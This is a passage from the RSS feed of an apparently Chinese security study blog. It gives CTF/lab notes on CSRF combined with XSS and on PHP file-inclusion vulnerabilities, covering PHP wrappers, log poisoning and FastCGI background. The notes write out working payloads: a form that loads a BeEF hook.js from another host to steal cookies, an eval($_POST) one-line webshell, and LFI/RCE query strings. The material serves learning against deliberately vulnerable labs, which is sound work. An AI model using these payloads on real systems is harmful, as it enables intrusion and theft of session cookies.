&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form method=&amp;quot;GET&amp;quot; name=&amp;quot;form0&amp;quot; action=&amp;quot;http://192.168.38.132:80/dvwa/vulnerabilities/xss_r/?name=&amp;lt;script src=&amp;#x27;http://192.168.38.129:3000/hook.js&amp;#x27;&amp;gt;&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;name&amp;quot; value=&amp;quot;&amp;lt;script src=&amp;#x27;http://192.168.38.129:3000/hook.js&amp;#x27;&amp;gt;&amp;lt;/script&amp;gt;&amp;quot;/&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3. 用户登录账户，点击我们的链接，我们就能在 xss 平台看到他的 cookie 了&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZWNoLm1laXR1YW4uY29tLzIwMTgvMTAvMTEvZmUtc2VjdXJpdHktY3NyZi5odG1s&#34;&gt;前端安全系列（二）：如何防止 CSRF 攻击？ - 美团技术团队 (meituan.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NDA2OS5odG1s&#34;&gt;鸡肋 CSRF 和 Self-XSS 组合的变废为宝 - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM0MTU5MS5odG1s&#34;&gt;CSRF 入门及靶场实战 - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/17/include/</guid>
            <title>file include</title>
            <link>http://example.com/2022/05/17/include/</link>
            <pubDate>Tue, 17 May 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;file-include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#file-include&#34;&gt;#&lt;/a&gt; file include&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;来自 pikachu 的介绍：&lt;/p&gt;
&lt;p&gt;文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：&lt;br&gt;
include(),include_once()&lt;br&gt;
require(),require_once()&lt;br&gt;
 这些文件包含函数，这些函数在代码设计中被经常使用到。&lt;/p&gt;
&lt;p&gt;大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个 “意想不到” 的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：&lt;br&gt;
**1. 本地文件包含漏洞：** 仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。&lt;br&gt;
**2. 远程文件包含漏洞：** 能够通过 url 地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。&lt;/p&gt;
&lt;p&gt;因此，在 web 应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;php伪协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php伪协议&#34;&gt;#&lt;/a&gt; PHP 伪协议&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;文件包含函数 (php):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;include&lt;/p&gt;
&lt;p&gt;include_once&lt;/p&gt;
&lt;p&gt;require&lt;/p&gt;
&lt;p&gt;require_one&lt;/p&gt;
&lt;p&gt;nclude 与 require 基本是相同的，除了错误处理方面:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;include ()，只生成警告（E_WARNING），并且脚本会继续&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;require ()，会生成致命错误（E_COMPILE_ERROR）并停止脚本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;include_once () 与 require ()_once ()，如果文件已包含，则不会包含，其他特性如上&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;直接包含 php，html 文件会直接执行，对于 txt 文件或者 linux 下普通文件，可以直接读取&lt;/p&gt;
&lt;p&gt;对于 php 伪协议，使用时需要注意 allow_url_open 和 allow_url_include ，有些伪协议会对此有限制，有些没有&lt;/p&gt;
&lt;h4 id=&#34;1file协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1file协议&#34;&gt;#&lt;/a&gt; 1.file 协议&lt;/h4&gt;
&lt;p&gt;allow_url_fopen ：off/on&lt;/p&gt;
&lt;p&gt;allow_url_include：off/on&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?file=file://D:/soft/phpStudy/WWW/phpcode.txt&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;2phpfilter&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2phpfilter&#34;&gt;#&lt;/a&gt; 2.php://filter&lt;/h4&gt;
&lt;p&gt;读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。&lt;/p&gt;
&lt;p&gt;allow_url_open=on/off&lt;/p&gt;
&lt;p&gt;allow_url_include=on/off&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?file=php://filter/read=convert.base64-encode/resource=web1.php&lt;/p&gt;
&lt;p&gt;?file=php://filter/write=convert.base64-decode/resource=web1.php&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;3phpinput&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3phpinput&#34;&gt;#&lt;/a&gt; 3.php://input&lt;/h4&gt;
&lt;p&gt;可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。http 方法为 get 时并不影响 input 接收 post 参数&lt;/p&gt;
&lt;p&gt;allow_url_open=on/off&lt;/p&gt;
&lt;p&gt;allow_url_include=on&lt;/p&gt;
&lt;p&gt;当然也可以在 post 中写入一句话木马 &lt;code&gt;&amp;lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]); ?&amp;gt;&#39;);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以配合 file_get_contents 读文件或者 system 执行系统命令，或者写马&lt;/p&gt;
&lt;h4 id=&#34;4zipbzip2-zlib&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4zipbzip2-zlib&#34;&gt;#&lt;/a&gt; 4.zip://,bzip2://, zlib://&lt;/h4&gt;
&lt;p&gt;allow_url_open=on/off&lt;/p&gt;
&lt;p&gt;allow_url_include=on/off&lt;/p&gt;
&lt;h5 id=&#34;41-zip&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#41-zip&#34;&gt;#&lt;/a&gt; 4.1 zip://&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果网站限制，可以将后缀改为 jgp，仍可以解析&lt;/p&gt;
&lt;p&gt;需要将 #进行 url 编码&lt;/p&gt;
&lt;h5 id=&#34;42-bzip2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#42-bzip2&#34;&gt;#&lt;/a&gt; 4.2 bzip2://&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;43-zlib&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#43-zlib&#34;&gt;#&lt;/a&gt; 4.3 zlib://&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;5data&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5data&#34;&gt;#&lt;/a&gt; 5.data://&lt;/h4&gt;
&lt;p&gt;allow_url_open=on&lt;/p&gt;
&lt;p&gt;allow_url_include=on&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?file=data://text/plain,&amp;lt;?php phpinfo()?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2021/png/2476579/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png?x-oss-process=image%2Fresize%2Cw_889%2Climit_0%2Fresize%2Cw_889%2Climit_0&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;一些小题目&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些小题目&#34;&gt;#&lt;/a&gt; 一些小题目&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta charset=&amp;quot;utf8&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$file = $_GET[&amp;quot;file&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(stristr($file,&amp;quot;php://filter&amp;quot;) || stristr($file,&amp;quot;zip://&amp;quot;) || stristr($file,&amp;quot;phar://&amp;quot;) || stristr($file,&amp;quot;data:&amp;quot;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	exit(&amp;#x27;hacker!&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if($file)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	if ($file!=&amp;quot;http://www.baidu.com&amp;quot;) echo &amp;quot;tips：flag在当前目录的某个文件中&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	include($file);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo &amp;#x27;&amp;lt;a href=&amp;quot;?file=http://www.baidu.com&amp;quot;&amp;gt;click go baidu&amp;lt;/a&amp;gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//file=php://input  &amp;lt;post&amp;gt; &amp;lt;?php system(&amp;#x27;dir&amp;#x27;); ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show_source(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;include(&amp;#x27;flag.php&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a= $_GET[&amp;quot;a&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($a)&amp;amp;&amp;amp;(file_get_contents($a,&amp;#x27;r&amp;#x27;)) === &amp;#x27;I want flag&amp;#x27;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo &amp;quot;success\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo $flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//a=php://input    &amp;lt;post&amp;gt; I want flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//file_get_contents可以读取input流&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta charset=&amp;quot;utf8&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$file = $_GET[&amp;quot;file&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (!$file) echo &amp;#x27;&amp;lt;a href=&amp;quot;?file=upload&amp;quot;&amp;gt;upload?&amp;lt;/a&amp;gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(stristr($file,&amp;quot;input&amp;quot;)||stristr($file, &amp;quot;filter&amp;quot;)||stristr($file,&amp;quot;data&amp;quot;)/*||stristr($file,&amp;quot;phar&amp;quot;)*/)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	echo &amp;quot;hack?&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	exit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	include($file);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- flag在当前目录的某个文件中 --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//?file=php://filter/read=convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;cgi-fast-cgiphp-fpm&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cgi-fast-cgiphp-fpm&#34;&gt;#&lt;/a&gt; CGI、FAST CGI，PHP FPM&lt;/h2&gt;
&lt;p&gt;CGI: 指的是 Web 服务器与 web 应用程序之间的一种数据交换协议。&lt;/p&gt;
&lt;p&gt;FastCGI: 类似于 CGI，Fast-CGI 也是一种通信协议，但是它在 CGI 的基础上，在效率上做了一些优化。只有非静态文件才会被 fastcgi 处理&lt;/p&gt;
&lt;p&gt;PHP-CGI: PHP-CGI 是 PHP 对 Web 服务器提供的 CGI 协议的接口程序，即实现了 CGI 协议的 php 解释器程序。它能解析 PHP，也能通过 CGI 与 web 服务器通信。&lt;/p&gt;
&lt;p&gt;PHP-FPM: 是 PHP 对 Web 服务器提供的 FastCGI 协议的接口程序，即在实现解释 PHP 脚本和与 web 服务器通讯的基础上，额外还提供了相对进程调度、任务管理功能。fastcgi process manager&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105160625653.png&#34; alt=&#34;image-20221105160625653&#34;&gt;&lt;/p&gt;
&lt;p&gt;Apache/nginx 加载 php：&lt;/p&gt;
&lt;p&gt;1. 通过 so 模块加载&lt;/p&gt;
&lt;p&gt;2. 通过 fpm&lt;/p&gt;
&lt;p&gt;3. 通过 cgi&lt;/p&gt;
&lt;p&gt;最佳方式是 apache/Nginx + fastcgi + php fpm&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105161200210.png&#34; alt=&#34;image-20221105161200210&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;p&gt;因此 PHP-fpm 是一个 fastcgi 进程管理器，是对于 fastcgi 协议的具体体现&lt;/p&gt;
&lt;p&gt;web 中间件和 phpfpm 的通信方式有两种&lt;/p&gt;
&lt;p&gt;1.socket&lt;/p&gt;
&lt;p&gt;2.TCP 模式&lt;/p&gt;
&lt;p&gt;fastcgi 协议由多个 recode 组成，recode 由 header 和 body 组成，中间件将这两种封装好发送给后端&lt;/p&gt;
&lt;p&gt;可见，一个 FastCGI record 结构最大支持的 body 大小是 2^16，也就是 65536 字节&lt;/p&gt;
&lt;p&gt;recode 中有 type 字段，type 有七种，第 4 种 type 是给 fmp 传递环境参数时表名数据为 key-value 对&lt;/p&gt;
&lt;p&gt;type=4 时，nginx 会将请求分为 key-value 形式，fpm 收到中间件发来的 key-value，最终执行 key 为 script_name，该 value 为你请求的路径&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164011830.png&#34; alt=&#34;image-20221105164011830&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164219506.png&#34; alt=&#34;image-20221105164219506&#34;&gt;&lt;/p&gt;
&lt;p&gt;服务器中间件和后端语言（PHP-FPM）通信，第一个数据包就是 type 为 1 的 record，后续互相交流，发送 type 为 4、5、6、7 的 record，结束时发送 type 为 2、3 的 record&lt;/p&gt;
&lt;p&gt;当后端语言（PHP-FPM）拿到由 Nginx 发过来的 FastCGl 数据包后，进行解析，得到上述这些环境变量。然后执行 SCRIPT_FILENAME 的值指向的 PHP 文件，也就是 /var/www/html/index.php&lt;/p&gt;
&lt;p&gt;php-Cgi:&lt;/p&gt;
&lt;p&gt;1) Cgi 协议的实现，用来解释 php 请求；过程: php 请求 -&amp;gt;php-Cgi 读取并解析 php.ini 文件，初始化环境 -&amp;gt; 根据请求参数，返回处理结果&lt;/p&gt;
&lt;p&gt;2）单个进程只能处理一个请求，每一个进程，都需读取 php.ini 进行解析，效率较低&lt;/p&gt;
&lt;p&gt;3）修改完 php.ini 文件，启动 php-Cgi 程序不会生效，无法平滑重启&lt;/p&gt;
&lt;h2 id=&#34;日志包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日志包含&#34;&gt;#&lt;/a&gt; 日志包含&lt;/h2&gt;
&lt;p&gt;一般日志位置 /var/log/httpd/access.log&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将木马写到日志中，知道日志文件名与路径，存在文件包含漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先在 url 中写入自己想要执行的内容，比如 &lt;code&gt;127.0.0.1/inlcude?&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但 url 中会被编码，导致无法包含&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;219.144.164.44 - - [30/Oct/2022:16:33:08 +0800] &amp;quot;GET /html/html/flag.php HTTP/1.1&amp;quot; 200 1311 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219.144.164.44 - - [30/Oct/2022:16:33:19 +0800] &amp;quot;GET /html/html/flag.php?%3C?php%20phpinfo();%20?%3E HTTP/1.1&amp;quot; 200 1311 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以通过抓包，修改为未编码的形式&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030163914509.png&#34; alt=&#34;image-20221030163914509&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &amp;quot;GET /html/html/flag.php?&amp;lt;?php phpinfo(); ?&amp;gt; HTTP/1.1&amp;quot; 200 1311 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &amp;quot;GET /html/html/flag.php?&amp;lt;?php phpinfo(); ?&amp;gt; HTTP/1.1&amp;quot; 200 1311 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在包含日志文件即可&lt;/p&gt;
&lt;p&gt;防止文件包含：文件名包含随机数，定期分割文件，更改日志路径&lt;/p&gt;
&lt;p&gt;如果是 bt 面板搭建的，记得关掉 open_basedir&lt;/p&gt;
